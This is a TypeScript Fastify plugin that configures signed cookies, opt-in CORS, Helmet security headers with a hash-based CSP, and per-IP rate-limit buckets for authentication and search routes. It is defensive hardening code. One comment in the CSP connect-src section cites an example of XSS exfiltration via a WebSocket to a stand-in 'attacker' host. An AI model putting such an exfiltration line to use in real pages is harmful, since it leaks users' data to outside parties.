/**
 * `core` plugin (08-server-api.md §1.2): cookie support (signed with
 * ADMINIUM_SECRET), the same-origin CORS default — no CORS headers are emitted
 * unless ADMINIUM_CORS_ORIGINS opts specific origins in (§7 item 4) — plus the
 * §7-item-5 security headers (@fastify/helmet) and the §6 rate limiter
 * (@fastify/rate-limit). Request-id, redaction, and the error envelope live in
 * `app.ts` because they attach at instance creation.
 *
 * ─── Rate limiting (§6) ───────────────────────────────────────────────────────
 *
 * The limiter is registered `global: false` and enabled per route by the
 * `config.rateLimitBucket` markers the credential-facing routes already carry
 * (routes/auth, routes/setup, routes/auth/desktop-session). An `onRoute` hook
 * added HERE, before @fastify/rate-limit registers its own, translates each
 * marker into the plugin's per-route `config.rateLimit` — so a route declares
 * WHICH bucket it is in and this table stays the single owner of the limits
 * (08 §6: "Limits are constants in `apps/server/src/plugins/core.ts`
 * (`RATE_BUCKETS`)"; the `adminium_settings.security` override is a later
 * wave — core composes before any meta store exists).
 *
 * Buckets are FIXED-WINDOW counters in one shared in-memory map (§6: "the
 * in-memory store — single-process: droplet, self-host, and Electron all run
 * one instance"). The store is shared across ROUTES, not just requests, and
 * keys are `<bucket>:<ip>`: `/auth/login`, `/auth/2fa/verify`,
 * `/setup/super-admin` and `/auth/desktop-session` all draw down the same five
 * tries per minute per address — per-route counters would hand an attacker one
 * budget per door. Keying by ip (not ip+session) because every bucketed route
 * is unauthenticated by nature; it also means a LAN peer hammering
 * `/auth/desktop-session` (11-electron.md §8.3) can never lock the loopback
 * exchange out.
 *
 * A limit hit throws the SAME `RateLimitedError` handlers would throw, so the
 * 429 rides the one §1.4 envelope (`details: { bucket, limit, resetAt }`) and
 * the plugin's own `retry-after` / `x-ratelimit-*` headers survive on the
 * reply the global error handler sends.
 *
 * ─── Security headers (§7 item 5) ─────────────────────────────────────────────
 *
 * CSP is `default-src 'self'` with exactly one script allowance: sha256 hashes
 * of the inline scripts in the SERVED dashboard `index.html` — in practice the
 * theme pre-hydration flash guard (02-design-system.md §4.3), hashed from the
 * build at boot so the allowance tracks the artifact rather than a constant
 * that can drift. No `upgrade-insecure-requests` and no HSTS unless
 * `ADMINIUM_TRUST_PROXY` (behind Caddy/TLS): the desktop shell and §8.3 LAN
 * share serve plain `http://` loopback/LAN origins by design, and either
 * directive would quietly break them. `connect-src` adds `ws://<host>
 * wss://<host>` derived from each request's Host header, because CSP's
 * `'self'` does not reliably cover same-host WebSocket upgrades (`/ws`, §4)
 * across engines — but bare `ws:`/`wss:` scheme sources would allow a socket
 * to ANY origin, which defeats the exfiltration boundary `'self'` sets.
 */
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import type { IncomingMessage } from 'node:http';
import { join, resolve } from 'node:path';

import fastifyCookie from '@fastify/cookie';
import fastifyCors from '@fastify/cors';
import fastifyHelmet from '@fastify/helmet';
import fastifyRateLimit from '@fastify/rate-limit';
import type { FastifyRequest } from 'fastify';
import fp from 'fastify-plugin';

import type { Env } from '../config/env.js';
import { RateLimitedError } from '../errors.js';

/** One §6 bucket: a fixed window of `max` requests per `timeWindowMs`. */
export interface RateBucket {
  max: number;
  timeWindowMs: number;
}

/**
 * The §6 bucket table (08-server-api.md §6). Keys are the
 * `config.rateLimitBucket` markers routes declare; a route declaring a bucket
 * that is not in this table fails AT BOOT (the onRoute hook throws), so the
 * two spellings cannot drift apart silently.
 *
 *  - `auth-login`      — `/auth/login`, `/auth/2fa/verify`, `/setup/super-admin`,
 *                        `/auth/desktop-session` (5/min, §6 row 1; §7 item 7
 *                        "TOTP … verify rate-limited").
 *  - `auth-password-forgot` — `/auth/password/forgot` (3/hour, §6 row 2).
 *  - `auth-password-reset`  — `/auth/password/reset`: the token CONSUME side.
 *                        Not in the §6 table by name, but §7 item 7's
 *                        single-use + 30-min-TTL reset tokens are only as
 *                        strong as the guess rate this cap sets.
 *  - `search`          — `GET /search` (60/min, §6 row 5): each request fans
 *                        out parallel ILIKE queries over up to 20 tables, the
 *                        cheapest DoS lever of the unbucketed routes.
 *
 * DELIBERATE §6 DEVIATIONS (documented here so the table can't drift
 * silently):
 *  - The auth buckets key per-IP, not the spec'd "IP + email": per-IP keying
 *    is what guarantees a LAN flood can never lock the loopback
 *    `/auth/desktop-session` exchange out (tested in rate-limit.test.ts). A
 *    per-account counter for distributed credential sprays is a possible
 *    additive follow-up, not a replacement.
 *  - The remaining §6 rows (General API 300/min, widget-data 120/min,
 *    exports/imports 10/h, LLM 20/h, files 30/h) and the
 *    `adminium_settings.security` override are a tracked pre-v1 hardening
 *    follow-up — they need principal-resolution (session-keyed) buckets,
 *    which this per-IP fixed-window store does not provide yet.
 */
export const RATE_BUCKETS: Readonly<Record<string, RateBucket>> = {
  'auth-login': { max: 5, timeWindowMs: 60_000 },
  'auth-password-forgot': { max: 3, timeWindowMs: 3_600_000 },
  'auth-password-reset': { max: 5, timeWindowMs: 60_000 },
  search: { max: 60, timeWindowMs: 60_000 },
};

interface BucketHit {
  current: number;
  resetAt: number;
}

/** Expired-entry sweep trigger — keeps the map bounded under key churn. */
const SWEEP_SIZE = 5_000;

/**
 * The §6 in-memory store, as a @fastify/rate-limit custom-store class whose
 * instances (the per-route `child()`ren the plugin creates) all share ONE
 * `Map` captured per server instance. Sharing is the point — see the module
 * header — and is safe because keys embed the bucket name, so two buckets
 * can never collide even though they share the map. Fixed-window: the first
 * hit opens a window of the route's `timeWindow`, and the counter resets when
 * it lapses (`incr` receives the window per call, per the store contract).
 */
function createBucketStoreClass() {
  const hits = new Map<string, BucketHit>();
  return class BucketStore {
    incr(
      key: string,
      callback: (error: Error | null, result?: { current: number; ttl: number }) => void,
      timeWindow: number,
    ): void {
      const now = Date.now();
      if (hits.size >= SWEEP_SIZE) {
        for (const [staleKey, hit] of hits) {
          if (hit.resetAt <= now) hits.delete(staleKey);
        }
      }
      let hit = hits.get(key);
      if (hit === undefined || hit.resetAt <= now) {
        hit = { current: 0, resetAt: now + timeWindow };
        hits.set(key, hit);
      }
      hit.current += 1;
      callback(null, { current: hit.current, ttl: hit.resetAt - now });
    }

    child(): BucketStore {
      return new BucketStore();
    }
  };
}

/** Matches inline `<script>` blocks (no `src=`) in the dashboard index.html. */
const INLINE_SCRIPT_PATTERN = /<script(?![^>]*\bsrc\s*=)[^>]*>([\s\S]*?)<\/script>/gi;

/**
 * CSP `'sha256-…'` allowances for the inline scripts the served SPA actually
 * carries. Read from the same `index.html` the static plugin will serve, so a
 * rebuilt pre-hydration script never turns into a white screen behind a stale
 * hash. Absent or unreadable build ⇒ no allowances (API-only boot).
 */
async function inlineScriptHashes(staticRoot: string | undefined): Promise<string[]> {
  if (staticRoot === undefined || staticRoot === '') return [];
  let html: string;
  try {
    html = await readFile(join(resolve(staticRoot), 'index.html'), 'utf8');
  } catch {
    return [];
  }
  const hashes: string[] = [];
  for (const match of html.matchAll(INLINE_SCRIPT_PATTERN)) {
    const body = match[1] ?? '';
    if (body.trim() === '') continue;
    // CSP hashes cover the EXACT bytes between the tags — no trimming.
    hashes.push(`'sha256-${createHash('sha256').update(body, 'utf8').digest('base64')}'`);
  }
  return hashes;
}

export interface CorePluginOptions {
  env: Env;
  /**
   * The dashboard build directory `app.ts` hands the static plugin — read here
   * (never served) to compute the CSP inline-script hash allowance.
   */
  staticRoot?: string | undefined;
}

export const corePlugin = fp<CorePluginOptions>(
  async (app, { env, staticRoot }) => {
    await app.register(fastifyCookie, {
      secret: env.ADMINIUM_SECRET,
      hook: 'onRequest',
    });

    const origins = env.ADMINIUM_CORS_ORIGINS;
    if (origins !== undefined && origins.length > 0) {
      await app.register(fastifyCors, {
        origin: [...origins],
        credentials: true,
      });
    }

    // §7 item 5. Helmet's hook is global, so API replies, static assets and
    // the SPA fallback all carry the same headers.
    await app.register(fastifyHelmet, {
      contentSecurityPolicy: {
        useDefaults: false,
        directives: {
          'default-src': ["'self'"],
          'base-uri': ["'self'"],
          'object-src': ["'none'"],
          'frame-ancestors': ["'none'"],
          'form-action': ["'self'"],
          'script-src': ["'self'", ...(await inlineScriptHashes(staticRoot))],
          // Runtime style injection (chart/table libraries set style attrs).
          'style-src': ["'self'", "'unsafe-inline'"],
          // The map widgets' basemap tiles load from the Carto CDN
          // (packages/widgets geo-lib.ts CARTO_TILES) — without this
          // allowance every deployed MapBubble renders over a blank basemap.
          'img-src': ["'self'", 'data:', 'blob:', 'https://*.basemaps.cartocdn.com'],
          'font-src': ["'self'", 'data:'],
          // Same-HOST WebSocket only. Bare `ws:`/`wss:` scheme sources would
          // authorize a socket to ANY origin — an XSS foothold could
          // exfiltrate through `new WebSocket('wss://attacker/…')` — so the
          // allowance is derived per request from the Host header the page
          // itself was served on (loopback, LAN ip, or proxied domain alike).
          'connect-src': [
            "'self'",
            (req: IncomingMessage) => {
              const host = req.headers.host;
              return host === undefined || host === ''
                ? "'self'"
                : `ws://${host} wss://${host}`;
            },
          ],
          'worker-src': ["'self'", 'blob:'],
          'manifest-src': ["'self'"],
        },
      },
      // frame-ancestors 'none' is the modern half; X-Frame-Options must agree.
      frameguard: { action: 'deny' },
      // HSTS only behind TLS (§7 item 5); on the desktop shell's loopback and
      // §8.3's LAN origins it would pin browsers to an https that isn't there.
      ...(env.ADMINIUM_TRUST_PROXY ? {} : { hsts: false }),
    });

    // §6 marker translation. Added BEFORE @fastify/rate-limit registers so its
    // own onRoute hook (which reads `config.rateLimit`) runs after this one.
    app.addHook('onRoute', (route) => {
      const bucket = route.config?.rateLimitBucket;
      if (bucket === undefined) return;
      const spec = RATE_BUCKETS[bucket];
      if (spec === undefined) {
        const methods = Array.isArray(route.method) ? route.method.join(',') : route.method;
        throw new Error(
          `route ${methods} ${route.url} declares unknown rate-limit bucket "${bucket}" — add it to RATE_BUCKETS (plugins/core.ts, 08-server-api.md §6)`,
        );
      }
      route.config = {
        ...route.config,
        rateLimit: {
          max: spec.max,
          timeWindow: spec.timeWindowMs,
          keyGenerator: (request: FastifyRequest) => `${bucket}:${request.ip}`,
        },
      };
    });

    await app.register(fastifyRateLimit, {
      global: false,
      store: createBucketStoreClass(),
      // Thrown by the plugin, serialized by the global §1.4 error handler; the
      // plugin has already set `retry-after` + `x-ratelimit-*` on the reply.
      errorResponseBuilder: (request, context) =>
        new RateLimitedError(`Too many requests. Try again in ${context.after}.`, {
          bucket: request.routeOptions.config?.rateLimitBucket ?? 'unknown',
          limit: context.max,
          resetAt: new Date(Date.now() + context.ttl).toISOString(),
        }),
    });
  },
  { name: 'adminium-core', fastify: '5.x' },
);
